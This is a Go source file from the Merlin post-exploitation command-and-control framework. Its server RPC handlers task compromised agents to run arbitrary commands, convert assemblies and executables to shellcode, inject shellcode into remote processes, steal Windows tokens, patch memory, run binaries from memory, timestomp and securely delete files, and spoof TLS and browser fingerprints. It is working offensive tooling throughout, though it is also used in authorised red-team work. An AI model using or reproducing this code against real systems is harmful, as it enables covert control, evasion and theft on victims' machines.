/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package rpc

import (
	// Standard
	"context"
	"encoding/base64"
	"fmt"
	"github.com/Ne0nd0g/merlin/v2/pkg/logging"
	"log/slog"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	// 3rd Party
	"github.com/google/uuid"

	// Internal
	"github.com/Ne0nd0g/merlin/v2/pkg/core"
	"github.com/Ne0nd0g/merlin/v2/pkg/modules/donut"
	"github.com/Ne0nd0g/merlin/v2/pkg/modules/sharpgen"
	"github.com/Ne0nd0g/merlin/v2/pkg/modules/winapi/createprocess"
	pb "github.com/Ne0nd0g/merlin/v2/pkg/rpc"
)

/* RPC METHODS TO TASK AGENTS */

// Any is used to execute arbitrary Agent commands. The first argument is the command to execute, and the remaining
// arguments are passed to the command
// in.Arguments[0] = command to execute (e.g., connect, download)
// in.Arguments[1:] = arguments to pass to the command
func (s *Server) Any(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	// Validate that an argument was provided
	if len(in.Arguments) < 1 {
		err = fmt.Errorf("the Any RPC call requires an argument, have (%d): %s", len(in.Arguments), in.Arguments)
		slog.Error(err.Error())
		return
	}
	var args []string
	if len(in.Arguments) > 1 {
		args = in.Arguments[1:]
	}
	return addJob(in.ID, in.Arguments[1], args)
}

// CD is used to change the agent's current working directory
// in.Arguments[0] = the directory path to change to
func (s *Server) CD(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	// Validate that an argument was provided
	if len(in.Arguments) < 1 {
		err = fmt.Errorf("the 'cd' command requires an argument")
		slog.Error(err.Error())
		return
	}
	return addJob(in.ID, "cd", in.Arguments)
}

// CheckIn creates an AgentInfo job that forces the Agent to send data back to the server
func (s *Server) CheckIn(ctx context.Context, id *pb.ID) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "id", id)
	return addJob(id.Id, "agentInfo", []string{})
}

// CMD is used to send a command to the agent to run a command or execute a program
// in.Arguments[0] = "cmd"
// in.Arguments[1:] = program and arguments to be executed on the host OS of the running agent
// Used with `cmd` and `shell` commands as well as through "standard" modules
func (s *Server) CMD(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	// Validate that at least two arguments were provided
	if len(in.Arguments) <= 1 {
		err = fmt.Errorf("the CMD RPC call requires at least two arguments, have: %+v", in.Arguments)
		slog.Error(err.Error())
		return
	}
	return addJob(in.ID, in.Arguments[0], in.Arguments[1:])
}

// Connect instructs an Agent to disconnect from its current server and connect to the new provided target
// in.Arguments[0] = the target address or URI to connect to
func (s *Server) Connect(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	// Validate that at least two arguments were provided
	if len(in.Arguments) < 1 {
		err = fmt.Errorf("the Connect RPC call requires at least one argument, have (%d): %+v", len(in.Arguments), in.Arguments)
		slog.Error(err.Error())
		return
	}
	return addJob(in.ID, "connect", in.Arguments)
}

// Download is used to download the file through the corresponding agent from the provided input file path
// in.Arguments[0] = the file path to download
func (s *Server) Download(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	// Validate that an argument was provided
	if len(in.Arguments) < 1 {
		err = fmt.Errorf("the Download RPC call requires an argument, have (%d): %s", len(in.Arguments), in.Arguments)
		slog.Error(err.Error())
		return
	}
	return addJob(in.ID, "download", in.Arguments)
}

// ENV is used to view or modify a host's environment variables
// in.Arguments[0] = the action to take (e.g., get, set, showall, unset)
// in.Arguments[1] = the name of the environment variable to modify
// in.Arguments[2] = the value to set the environment variable to
func (s *Server) ENV(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	// Validate that at least one argument was provided
	if len(in.Arguments) < 1 {
		err = fmt.Errorf("the ENV RPC call requires at least one argument, have (%d): %s", len(in.Arguments), in.Arguments)
		slog.Error(err.Error())
		return
	}
	return addJob(in.ID, "env", in.Arguments)
}

// ExecuteAssembly calls the donut module to create shellcode from a .NET 4.0 assembly and then uses the CreateProcess
// module to create a job that executes the shellcode in a remote process
// in.Arguments[0] .NET assembly File bytes as Base64 string
// in.Arguments[1] .NET assembly arguments
// in.Arguments[2] SpawnTo path
// in.Arguments[3] SpawnTo arguments
func (s *Server) ExecuteAssembly(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	msg = &pb.Message{}
	// Validate that four arguments were provided
	if len(in.Arguments) < 4 {
		err = fmt.Errorf("the ExecuteAssembly RPC call requires four arguments, have (%d): %s", len(in.Arguments), in.Arguments)
		slog.Error(err.Error())
		return
	}

	// 0. .NET assembly File bytes as Base64 string
	// 1. .NET assembly arguments
	// 2. SpawnTo path
	// 3. SpawnTo arguments

	// Build Donut Config
	config := donut.GetDonutDefaultConfig()
	config.ExitOpt = 2
	config.Type = 2 //DONUT_MODULE_NET_EXE = 2; .NET EXE. Executes Main if no class and method provided
	// TODO Dynamically determine the runtime version; Donut's DownloadFile() only takes a file path
	config.Runtime = "v4.0.30319"
	config.Entropy = 3
	config.Parameters = in.Arguments[1]

	// Convert assembly into shellcode with donut
	donutBuffer, err := donut.BytesFromString(in.Arguments[0], config)
	if err != nil {
		err = fmt.Errorf("there was an error calling the ExecuteAssembly RPC function: %s", err)
		slog.Error(err.Error())
		return
	}

	// Build an options' map
	options := make(map[string]string)
	options["spawnto"] = in.Arguments[2]
	options["args"] = in.Arguments[3]
	options["shellcode"] = base64.StdEncoding.EncodeToString(donutBuffer.Bytes())

	//Get CreateProcess job
	j, err := createprocess.Parse(options)
	if err != nil {
		err = fmt.Errorf("there was an error generating a CreateProcess job in the ExecuteAssembly RPC function: %s", err)
		slog.Error(err.Error())
		return
	}
	return addJob(in.ID, j[0], j[1:])
}

// ExecutePE calls the donut module to create shellcode from PE and then uses the CreateProcess
// module to create a job that executes the shellcode in a remote process
// in.Arguments[0] PE file bytes as Base64 string
// in.Arguments[1] PE arguments
// in.Arguments[2] SpawnTo path
// in.Arguments[3] SpawnTo arguments
func (s *Server) ExecutePE(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	msg = &pb.Message{}
	// Validate that four arguments were provided
	if len(in.Arguments) < 4 {
		err = fmt.Errorf("the ExecutePE RPC call requires four arguments, have (%d): %s", len(in.Arguments), in.Arguments)
		slog.Error(err.Error())
		return
	}

	// 0. PE File bytes as Base64 string
	// 1. PE arguments
	// 2. SpawnTo path
	// 3. SpawnTo arguments

	// Build Donut Config
	config := donut.GetDonutDefaultConfig()
	config.ExitOpt = 2
	config.Type = 4 //DONUT_MODULE_EXE = 4
	config.Entropy = 3
	config.Parameters = in.Arguments[1]

	// Convert assembly into shellcode with donut
	donutBuffer, err := donut.BytesFromString(in.Arguments[0], config)
	if err != nil {
		err = fmt.Errorf("there was an error calling the ExecutePE RPC function: %s", err)
		slog.Error(err.Error())
		return
	}

	// Build an options' map
	options := make(map[string]string)
	options["spawnto"] = in.Arguments[2]
	options["args"] = in.Arguments[3]
	options["shellcode"] = base64.StdEncoding.EncodeToString(donutBuffer.Bytes())

	//Get CreateProcess job
	j, err := createprocess.Parse(options)
	if err != nil {
		err = fmt.Errorf("there was an error generating a CreateProcess job in the ExecuteAssembly RPC function: %s", err)
		slog.Error(err.Error())
		return
	}
	return addJob(in.ID, j[0], j[1:])
}

// ExecuteShellcode calls the corresponding shellcode module to create a job that executes the provided shellcode
// in.Arguments[0] shellcode bytes as Base64 string
// in.Arguments[1] shellcode execution method (e.g., self|remote|RtlCreateUserThread|UserAPC)
// in.Arguments[2] PID to inject shellcode into (not used with the "self" method)
func (s *Server) ExecuteShellcode(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	// Validate that at least one argument was provided
	if len(in.Arguments) < 2 {
		err = fmt.Errorf("the ExecuteShellcode RPC call requires at least two arguments, have (%d): %s", len(in.Arguments), in.Arguments)
		slog.Error(err.Error())
		return
	}
	return addJob(in.ID, "shellcode", in.Arguments)
}

// Exit instructs the agent to quit running
func (s *Server) Exit(ctx context.Context, id *pb.ID) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "id", id)
	msg, err = addJob(id.Id, "exit", []string{})
	if err != nil {
		return
	}

	// Parse the UUID from the request
	agentID, err := uuid.Parse(id.Id)
	if err != nil {
		err = fmt.Errorf("there was an error parsing '%s' as a UUID: %s", agentID, err)
		slog.Error(err.Error())
		return
	}

	err = s.agentService.UpdateAlive(agentID, false)
	if err != nil {
		err = fmt.Errorf("there was an error updating the agent's alive status: %s", err)
		slog.Error(err.Error())
		msg.Message += fmt.Sprintf("\n\t%s", err)
		msg.Error = true
	}

	return
}

func (s *Server) IFConfig(ctx context.Context, id *pb.ID) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "id", id)
	return addJob(id.Id, "ifconfig", []string{})
}

// InvokeAssembly executes an assembly that was previously loaded with the load-assembly command
// in.Arguments[0] = the assembly name
// in.Arguments[1:] = arguments to pass to the assembly
func (s *Server) InvokeAssembly(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	// Validate that at least one argument was provided
	if len(in.Arguments) < 1 {
		err = fmt.Errorf("the InvokeAssembly RPC call requires at least one argument, have (%d): %s", len(in.Arguments), in.Arguments)
		slog.Error(err.Error())
		return
	}
	return addJob(in.ID, "invoke-assembly", in.Arguments)
}

// JA3 is used to change the Agent's JA3 signature
// in.Arguments[0] = the JA3 string to change to the TLS client to
func (s *Server) JA3(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "ja3", in.Arguments)
}

// KillDate configures the date and time that the agent will stop running
// in.Arguments[0] = Unix epoch date and time the Agent should stop running
func (s *Server) KillDate(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "killdate", in.Arguments)
}

// KillProcess tasks an agent to kill a process by its number identifier
// in.Arguments[0] = the process ID to kill
func (s *Server) KillProcess(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "killprocess", in.Arguments)
}

// LinkAgent tasks a parent agent to connect to and link a child agent
// in.Arguments[0] = the link method (e.g., add|list|remove|refresh|tcp|udp|smb)
// in.Arguments[1] = method arguments
func (s *Server) LinkAgent(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	if len(in.Arguments) < 1 {
		err = fmt.Errorf("the LinkAgent RPC call requires at least one argument, have (%d): %s", len(in.Arguments), in.Arguments)
		slog.Error(err.Error())
		return
	}
	switch strings.ToLower(in.Arguments[0]) {
	case "add":
		// 0. add, 1. UUID
		if len(in.Arguments) < 2 {
			err = fmt.Errorf("the LinkAgent 'add' RPC call requires two arguments, have (%d): %s", len(in.Arguments), in.Arguments)
			slog.Error(err.Error())
			return
		}
		// Parse the Agent iD
		var agentID uuid.UUID
		agentID, err = uuid.Parse(in.ID)
		if err != nil {
			err = fmt.Errorf("there was an error parsing '%s' as a UUID: %s", in.ID, err)
			slog.Error(err.Error())
			return
		}
		// Parse the UUID from the request
		var childID uuid.UUID
		childID, err = uuid.Parse(in.Arguments[1])
		if err != nil {
			err = fmt.Errorf("there was an error parsing '%s' as a UUID: %s", in.Arguments[1], err)
			slog.Error(err.Error())
			return
		}
		err = s.agentService.Link(agentID, childID)
		if err != nil {
			err = fmt.Errorf("there was an error linking the agents: %s", err)
			slog.Error(err.Error())
			return
		}
		msg = NewPBSuccessMessage(fmt.Sprintf("Successfully added child agent %s link to parent agent %s", childID, agentID))
		return
	default:
		return addJob(in.ID, "link", in.Arguments)
	}
}

// ListAssemblies instructs the agent to list the .NET assemblies that are currently loaded into the agent's process
// .NET assemblies are loaded with the LoadAssembly call
func (s *Server) ListAssemblies(ctx context.Context, id *pb.ID) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "id", id)
	return addJob(id.Id, "list-assemblies", []string{})
}

// Listener interacts with Agent listeners used for peer-to-peer communications
// in.Arguments[0] = the listener method (e.g., list|start|stop)
// in.Arguments[1] = method arguments
func (s *Server) Listener(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "listener", in.Arguments)
}

// LoadAssembly instructs the agent to load a .NET assembly into the agent's process
// in.Arguments[0] = a Base64 encoded string of the assembly bytes
// in.Arguments[1] = the assembly name
// in.Arguments[2] = calculated SHA256 hash of the assembly
func (s *Server) LoadAssembly(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "load-assembly", in.Arguments)
}

// LoadCLR loads the .NET Common Language Runtime (CLR) into the agent's process.
// .NET assemblies can subsequently be loaded with the LoadAssembly call and executed with the InvokeAssembly call
// in.Arguments[0] = the .NET CLR version to load (e.g., v2.0.50727, v4.0.30319, or v4.0)
func (s *Server) LoadCLR(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "load-clr", in.Arguments)
}

// LS uses native Go to list the directory contents of the provided path
// in.Arguments[0] = the directory path to list
func (s *Server) LS(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "ls", in.Arguments)
}

// MaxRetry configures the amount of times an Agent will try to check in before it quits
func (s *Server) MaxRetry(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	if len(in.Arguments) < 1 {
		err = fmt.Errorf("the MaxRetry RPC call requires at least one argument, have (%d): %s", len(in.Arguments), in.Arguments)
		slog.Error(err.Error())
		return
	}
	// Parse the UUID from the request
	agentID, err := uuid.Parse(in.ID)
	if err != nil {
		err = fmt.Errorf("there was an error parsing '%s' as a UUID: %s", in.ID, err)
		slog.Error(err.Error())
		return
	}

	// Need to set the Sleep time on the server first to calculate JWT lifetime
	a, err := s.agentService.Agent(agentID)
	if err != nil {
		err = fmt.Errorf("there was an error getting agent %s: %s", agentID, err)
		slog.Error(err.Error())
		return
	}

	comms := a.Comms()
	comms.Retry, err = strconv.Atoi(in.Arguments[0])
	if err != nil {
		err = fmt.Errorf("there was an error parsing '%s' as an integer: %s", in.Arguments[0], err)
		slog.Error(err.Error())
		return
	}

	err = s.agentService.UpdateComms(agentID, comms)
	if err != nil {
		err = fmt.Errorf("there was an error updating the agent's comms: %s", err)
		slog.Error(err.Error())
		return
	}

	return addJob(in.ID, "maxretry", in.Arguments)
}

// Memory interacts with virtual memory on the operating system where the agent is running
// in.Arguments[0] = the memory method (e.g., read|write|patch)
// in.Arguments[1:] = method arguments
func (s *Server) Memory(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "memory", in.Arguments)
}

// MEMFD run a linux executable "from memory"
// in.Arguments[0] = the executable as a base64 encoded string
// in.Arguments[1:] = arguments to pass to the executable
func (s *Server) MEMFD(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "memfd", in.Arguments)
}

// Netstat is used to print network connections on the target system
// in.Arguments[0] = -p OPTIONAL
// in.Arguments[1] = the protocol to filter on (e.g., tcp or udp) OPTIONAL
func (s *Server) Netstat(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "netstat", in.Arguments)
}

// Nslookup instructs the agent to perform a DNS query on the input
// in.Arguments[0: ] = the host name or IP address to query
func (s *Server) Nslookup(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "nslookup", in.Arguments)
}

// Padding configures the maximum size for the random amount of padding added to each message
// in.Arguments[0] = the maximum size of the padding
func (s *Server) Padding(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "padding", in.Arguments)
}

// Parrot configures the Agent's HTTP connection to mimic a specific browser
// in.Arguments[0] = the browser to mimic (e.g., HelloChrome_Auto)
func (s *Server) Parrot(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "parrot", in.Arguments)
}

// Pipes enumerates and displays named pipes on Windows hosts only
func (s *Server) Pipes(ctx context.Context, id *pb.ID) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "id", id)
	return addJob(id.Id, "pipes", []string{})
}

// PS displays running processes
func (s *Server) PS(ctx context.Context, id *pb.ID) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "id", id)
	return addJob(id.Id, "ps", []string{})
}

// PWD is used to print the Agent's current working directory
func (s *Server) PWD(ctx context.Context, id *pb.ID) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "id", id)
	return addJob(id.Id, "pwd", []string{})
}

// RM removes or deletes a file
// in.Arguments[0] = the file path to remove
func (s *Server) RM(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "rm", in.Arguments)
}

// RunAs creates a new process as the provided user
// in.Arguments[0] = the domain\username to run the program as
// in.Arguments[1] = the password for the provided user
// in.Arguments[2] = the program to run
// in.Arguments[3:] = the arguments to pass to the program
func (s *Server) RunAs(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "runas", in.Arguments)
}

// SecureDelete securely deletes supplied file
// in.Arguments[0] = the file path to securely delete
func (s *Server) SecureDelete(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "sdelete", in.Arguments)
}

// SharpGen generates a .NET core assembly, converts it to shellcode with go-donut, and executes it in the spawnto process
// in.Arguments[0] = the .NET Core C# code, as a string, to compile
// in.Arguments[1] = the SpawnTo process to inject the shellcode into
// in.Arguments[2] = the arguments to pass to the SpawnTo process (optional)
func (s *Server) SharpGen(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	// Set the assembly filepath
	options := make(map[string]string)

	if len(in.Arguments) < 1 {
		err = fmt.Errorf("the SharpGen module requires at least one argument")
		return
	}
	options["code"] = fmt.Sprintf("Console.WriteLine(%s);", in.Arguments[0])

	// Set the SpawnTo path
	if len(in.Arguments) > 1 {
		options["spawnto"] = in.Arguments[1]
	} else {
		options["spawnto"] = "C:\\WIndows\\System32\\dllhost.exe"
	}

	// Set the SpawnTo arguments, if any
	if len(in.Arguments) > 2 {
		options["args"] = in.Arguments[2]
	} else {
		options["args"] = ""
	}

	currentDir, err := os.Getwd()
	if err != nil {
		err = fmt.Errorf("there was an error getting the current directory: %s", err)
		slog.Error(err.Error())
		return
	}
	sharpGenDLL := filepath.Join(currentDir, "data", "src", "cobbr", "SharpGen", "bin", "release", "netcoreapp2.1", "SharpGen.dll")
	sharpGenExe := filepath.Join(currentDir, "sharpgen.exe")

	// Set SharpGen Module Parse() options
	options["dotnetbin"] = "dotnet"
	options["sharpgenbin"] = sharpGenDLL
	options["help"] = "false"
	options["file"] = sharpGenExe
	options["dotnet"] = ""
	options["output-kind"] = ""
	options["platform"] = ""
	options["no-optimization"] = "false"
	options["assembly-name"] = ""
	options["source-file"] = ""
	options["class-name"] = ""
	options["confuse"] = ""

	if core.Verbose {
		options["verbose"] = "true"
	} else {
		options["verbose"] = "false"
	}

	j, err := sharpgen.Parse(options)
	if err != nil {
		err = fmt.Errorf("there was an error using the SharpGen module: %s", err)
		slog.Error(err.Error())
		return
	}

	return addJob(in.ID, j[0], in.Arguments)
}

// Skew configures the amount of skew an Agent uses to randomize checkin times
// in.Arguments[0] = the amount of skew to use
func (s *Server) Skew(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "skew", in.Arguments)
}

// Sleep configures the Agent's sleep time between checkins
// in.Arguments[0] = the amount of time to sleep between checkins
func (s *Server) Sleep(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	// Parse the UUID from the request
	agentID, err := uuid.Parse(in.ID)
	if err != nil {
		err = fmt.Errorf("there was an error parsing '%s' as a UUID: %s", in.ID, err)
		slog.Error(err.Error())
		return
	}

	// Get the Agent
	a, err := s.agentService.Agent(agentID)
	if err != nil {
		err = fmt.Errorf("there was an error getting agent %s: %s", agentID, err)
		slog.Error(err.Error())
		return
	}

	// Update the Agent's Comms
	comms := a.Comms()
	comms.Wait = in.Arguments[0]

	// Need to set the Sleep time on the server first to calculate JWT lifetime
	err = s.agentService.UpdateComms(agentID, comms)
	if err != nil {
		err = fmt.Errorf("there was an error updating the agent's comms: %s", err)
		slog.Error(err.Error())
		return
	}

	return addJob(in.ID, "sleep", in.Arguments)
}

// SSH executes a command on a remote host through the SSH protocol and returns the output
// in.Arguments[0] = SSH username
// in.Arguments[1] = SSH password
// in.Arguments[2] = the SSH host:port
// in.Arguments[3] = the program to execute
// in.Arguments[4] = program arguments (optional)
func (s *Server) SSH(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "ssh", in.Arguments)
}

// Token is used to interact with Windows Access Tokens on the agent
// args[0] = the token method (e.g., make|privs|rev2self|steal|whoami)
// args[1:] = method arguments
func (s *Server) Token(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "token", in.Arguments)
}

// Touch matches the destination file's timestamps with source file
// in.Arguments[0] = the source file
// in.Arguments[1] = the destination file
func (s *Server) Touch(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "touch", in.Arguments)
}

// UnlinkAgent instructs the parent Agent to close, or unlink, the connection with the child Agent
// in.Arguments[0] = the child Agent's UUID
func (s *Server) UnlinkAgent(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	// Parse the UUID from the request
	agentID, err := uuid.Parse(in.ID)
	if err != nil {
		err = fmt.Errorf("there was an error parsing '%s' as a UUID: %s", in.ID, err)
		slog.Error(err.Error())
		return
	}

	// Parse the link UUID from the request
	link, err := uuid.Parse(in.Arguments[0])
	if err != nil {
		err = fmt.Errorf("there was an error parsing '%s' as a UUID: %s", in.Arguments[0], err)
		slog.Error(err.Error())
		return
	}

	// Remove the linked Agent from the server
	err = s.agentService.Unlink(agentID, link)
	if err != nil {
		err = fmt.Errorf("there was an error unlinking the agents: %s", err)
		slog.Error(err.Error())
		return
	}
	return addJob(in.ID, "unlink", in.Arguments)
}

// Upload transfers a file from the Merlin Server to the Agent
// in.Arguments[0] = the source file as a base64 encoded string
// in.Arguments[1] = the destination file path
func (s *Server) Upload(ctx context.Context, in *pb.AgentCMD) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "in", in)
	return addJob(in.ID, "upload", in.Arguments)
}

// Uptime retrieves the target host's uptime. Windows only
func (s *Server) Uptime(ctx context.Context, id *pb.ID) (msg *pb.Message, err error) {
	slog.Log(context.Background(), logging.LevelTrace, "entering into function", "context", ctx, "id", id)
	return addJob(id.Id, "uptime", []string{})
}
